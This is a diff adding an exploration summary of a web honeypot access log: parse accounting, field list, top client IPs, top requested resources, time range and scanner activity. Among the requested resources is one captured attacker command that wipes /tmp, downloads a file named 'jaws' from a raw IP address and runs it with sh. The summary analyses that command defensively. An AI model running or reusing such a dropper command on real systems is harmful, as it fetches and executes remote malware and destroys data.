@@ -1,0 +1,86 @@
+============================================================
+PRACTICAL 1 — EXPLORATION SUMMARY
+============================================================
+
+1. Dataset
+   Filename: cj.log (Size: 225,867,389 bytes, 215.40 MB)
+
+2. Detected Log Format
+   Web Honeypot / Intrusion Detection Access Log (JSON Array) (8-element serialized JSON array capturing network, client, and attack indicators)
+
+3. Total Log Entries & Exact Accounting
+   Physical lines in file    : 2,062,365
+   Blank lines omitted       : 934
+   Non-blank physical lines  : 2,061,431
+   Multi-entry lines ('][')  : 911 (yielding +930 extra records)
+   Total extracted records   : 2,062,361
+   Accounting reconciliation : Physical (2,062,365) - Blank (934) + Split expansion (930) = 2,062,361 extracted entries (-4 net difference).
+
+4. Successfully Parsed Entries
+   2,062,330 entries
+
+5. Malformed Entries
+   31 entries
+
+6. Parsing Success Rate
+   99.9985%
+
+7. Fields Identified
+   category_type, payload, timestamp, client_ip, client_port, user_agent, accept_language, proxy_ip
+
+8. Most Common HTTP Methods
+   Not applicable: HTTP Method is not a standalone field in this Honeypot JSON-array schema.
+
+9. Most Common Status Codes
+   Not applicable: HTTP Status Code is not recorded as a standalone field in this log format.
+
+10. Top IP Addresses
+    - 212.60.12.161     :    612,203 requests (29.69%)
+    - 103.111.33.197    :    310,134 requests (15.04%)
+    - 157.32.35.29      :    273,646 requests (13.27%)
+    - 152.58.35.97      :    259,128 requests (12.56%)
+    - 199.188.238.77    :    115,798 requests ( 5.61%)
+    - 49.36.67.24       :     62,872 requests ( 3.05%)
+    - 49.36.64.212      :     45,726 requests ( 2.22%)
+    - 14.139.122.76     :     23,909 requests ( 1.16%)
+    - 106.205.210.163   :     23,052 requests ( 1.12%)
+    - 152.58.60.21      :     22,075 requests ( 1.07%)
+
+11. Top Requested Resources
+    - auto                :    9,684 occurrences
+    - lang                :    4,692 occurrences
+    - author              :    1,325 occurrences
+    - XDEBUG_SESSION_START:      593 occurrences
+    - id                  :      435 occurrences
+    - panel               :      364 occurrences
+    - doing_wp_cron       :      317 occurrences
+    - index               :      260 occurrences
+    - file                :      202 occurrences
+    - cd_/tmp;rm_-rf_*;wget_94_158_247_123/jaws;sh_/tmp/jaws:      174 occurrences
+
+12. Time Range
+    From: 2023-01-08 08:07:15
+    To:   2024-02-19 21:44:01
+    Span: 407 days, 13 hours
+
+13. Missing Data
+    - category_type     :  2,035,084 missing (98.68%)
+    - payload           :  2,046,199 missing (99.22%)
+    - timestamp         :          0 missing ( 0.00%)
+    - client_ip         :          0 missing ( 0.00%)
+    - client_port       :          0 missing ( 0.00%)
+    - user_agent        :     26,153 missing ( 1.27%)
+    - accept_language   :  2,000,684 missing (97.01%)
+    - proxy_ip          :  2,014,446 missing (97.68%)
+
+14. Key Observations
+    - Automated security fuzzers account for over 87% of all requests:
+      'gobuster/3.6' produced 1,395,592 requests (67.67%).
+      'OWASP DirBuster' produced 398,116 requests (19.30%).
+    - High IP concentration: Top IP (212.60.12.161) alone issued 612,203 requests (29.69%).
+    - Concurrency artifacts: 911 lines contained concatenated '][' records, safely handled by the parser.
+
+15. Conclusion
+    Practical 1 successfully demonstrated loading, structural pattern discovery, regex-based parsing,
+    and exploratory analysis of 2.06 million unstructured server access log records with 99.9985% accuracy.
+============================================================
